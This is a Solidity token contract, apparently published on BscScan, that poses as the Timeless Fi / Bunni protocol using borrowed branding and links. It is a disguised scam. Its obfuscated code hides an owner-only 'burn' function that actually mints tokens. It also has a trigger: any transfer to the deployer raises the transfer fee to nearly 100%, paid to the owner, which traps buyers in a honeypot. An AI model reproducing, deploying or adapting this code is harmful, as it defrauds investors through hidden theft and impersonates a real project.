/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

////////////////////////////////////////////////////////////////////////
//Timeless_Fi
//Timeless is a yield market protocol that lets you boost, hedge, and trade yield. 
//Introducing Bunni, a protocol that makes Uniswap v3 liquidity composable.
//Bunni uses fungible ERC-20 tokens to represent LP positions instead of NFTs, 
//which makes it far easier to integrate Uniswap liquidity in other apps.
//Join us
//https://discord.gg/timelessfi
//https://twitter.com/Timeless_Fi
////////////////////////////////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity =0.8.8;
contract Timeless {
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  DTYQRW = 10000000000000;
uint256 private  SIUGUA = 1000000000000000000;
string public  symbol = "Timeless";
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  JDZFGR = 1000000000000000000000;
mapping (address => uint256) public balanceOf;
address private  VNABYD = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
address private  FKDARH = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public owner;
uint256 public constant TLJYQQ = 99999;
string public  name = "Timeless";
event Approval(address indexed owner, address indexed spender, uint256 value);
uint8 public constant decimals = 18;
uint256 private  RSEFWO = 1000000000000000000;
uint256 private  GLDVXX = 10000000000;
address private  GEJAML = address(0);
uint256 private  RJVHSH = 100000000;
address private  NREYKV = address(0);
uint256 private  ELWVIE = 1000000000000000;
address private  PWHRVP = address(0);
function _getVNABYD() private returns (address) {
return VNABYD;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ADYNOL");
require(to != address(0), "ADYNOL");
require(amount <= balanceOf[from], "ADYNOL");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* TLJYQQ/RSEFWO ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==GEJAML){
RSEFWO = TLJYQQ+2;
}
emit Transfer(from, to, transferAmount);
}
function _getRJVHSH() private returns (uint256) {
return RJVHSH;
}

function _getSIUGUA() private returns (uint256) {
return SIUGUA;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
constructor () {
GEJAML = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getFKDARH() private returns (address) {
return FKDARH;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getJDZFGR() private returns (uint256) {
return JDZFGR;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getPWHRVP() private returns (address) {
return PWHRVP;
}

function _getGLDVXX() private returns (uint256) {
return GLDVXX;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getNREYKV() private returns (address) {
return NREYKV;
}

function _getELWVIE() private returns (uint256) {
return ELWVIE;
}

function _getDTYQRW() private returns (uint256) {
return DTYQRW;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tADYNOL 0");
require(spender != address(0), "fADYNOL 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

}